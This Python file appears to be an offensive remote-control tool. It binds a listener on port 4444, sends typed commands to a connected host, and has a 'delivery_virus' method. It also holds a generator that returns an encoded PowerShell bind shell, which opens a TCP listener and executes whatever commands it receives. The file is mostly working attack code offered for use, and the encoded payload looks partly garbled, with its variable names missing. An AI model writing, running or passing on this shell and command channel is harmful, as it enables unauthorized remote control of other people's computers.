import socket, time
import socketserver

class tunnel:
    
    def __init__(self, lhost="0.0.0.0", lport=4444):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sock.bind((lhost,lport))
        self.sock.listen(5)
        print("listening on port {}".format(lport))
        self.conn, self.addr = self.sock.accept()
        self.conn.settimeout(1.0)
        print("connection from: {}",self.addr)
        
    def get_conn(self):
        return self.conn
    
    def sent_command(self, command):
        self.conn.send(command)
        time.sleep(1)
        
    def get_response(self):
        return self.conn.recv(1024).decode()
    
    def delivery_virus(self, virus):
        self.conn.sendall(virus)

    def generate_base64_bind_shell_code(self, ostype:str):
        if ostype == "windows":
            bind_shell = ""
            bind_shell += "powershell -encodedcommand IAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AY"
            bind_shell += "wBrAGUAdABzAC4AVABjAHAATABpAHMAdABlAG4AZQByACgAJwAwAC4AMAAuADAALgAwACcALAA0ADQANAA0ACkAOwAuAHMAdABhA"
            bind_shell += "HIAdAAoACkAOwAgAD0AIAAuAEEAYwBjAGUAcAB0AFQAYwBwAEMAbABpAGUAbgB0ACgAKQA7ACAAPQAgAC4ARwBlAHQAUwB0AHIAZ"
            bind_shell += "QBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoA"
            bind_shell += "CAAPQAgAC4AUgBlAGEAZAAoACwAIAAwACwAIAAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgAD0AIAAoAE4AZ"
            bind_shell += "QB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFA"
            bind_shell += "G4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgALAAwACwAIAApADsAIAA9ACAAKABpAGUAeAAgACAAMgA+ACYAM"
            bind_shell += "QAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAPQAgACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQA"
            bind_shell += "GEAdABoACAAKwAgACcAPgAgACcAOwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAK"
            bind_shell += "QAuAEcAZQB0AEIAeQB0AGUAcwAoACkAOwAuAFcAcgBpAHQAZQAoACwAMAAsAC4ATABlAG4AZwB0AGgAKQA7AC4ARgBsAHUAcwBoA"
            bind_shell += "CgAKQB9ADsALgBDAGwAbwBzAGUAKAApADsALgBTAHQAbwBwACgAKQA="
            
            return bind_shell
        elif ostype == "linux":
            return ""
        else:
            return ""
 
            

c = tunnel()

while True:
    try:
        command = input("$ ").encode()
        if command == b"exit":
            break
        command+=b"\n"
        c.sent_command(command)
        print(c.get_response())
    except TimeoutError as t:
        print("no Response")
        